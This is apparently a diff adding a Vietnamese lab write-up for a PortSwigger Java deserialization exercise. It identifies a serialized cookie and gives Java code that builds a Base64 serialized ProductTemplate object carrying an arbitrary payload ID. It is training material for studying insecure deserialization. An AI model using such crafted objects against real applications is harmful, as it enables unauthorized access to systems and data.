@@ -154,4 +154,58 @@ Bỏ nó vào cookie và request.
 
 ---
 
-### 8. 
+### 8. Developing a custom gadget chain for Java deserialization
+https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization
+
+![alt text](image-16.png)
+
+Cookie bắt đầu bằng `rO0` ta nhận diện đây là serialize của JAVA
+
+![alt text](image-17.png)\
+![alt text](image-18.png)\
+![alt text](image-19.png)
+
+Ở `backup/ProductTemplate.java` ta thấy:\
+![alt text](image-20.png)
+
+Dựa vào đó ta sẽ viết 1 đoạn ctr java để tạo instance của ProductTemplate với ID bất kì. 
+
+```java
+import data.productcatalog.ProductTemplate;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.io.Serializable;
+import java.util.Base64;
+
+class Main {
+    public static void main(String[] args) throws Exception {
+        ProductTemplate originalObject = new ProductTemplate("your-payload-here");
+
+        String serializedObject = serialize(originalObject);
+
+        System.out.println("Serialized object: " + serializedObject);
+
+        ProductTemplate deserializedObject = deserialize(serializedObject);
+
+        System.out.println("Deserialized object ID: " + deserializedObject.getId());
+    }
+
+    private static String serialize(Serializable obj) throws Exception {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
+        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
+            out.writeObject(obj);
+        }
+        return Base64.getEncoder().encodeToString(baos.toByteArray());
+    }
+
+    private static <T> T deserialize(String base64SerializedObj) throws Exception {
+        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) {
+            @SuppressWarnings("unchecked")
+            T obj = (T) in.readObject();
+            return obj;
+        }
+    }
+}
+```
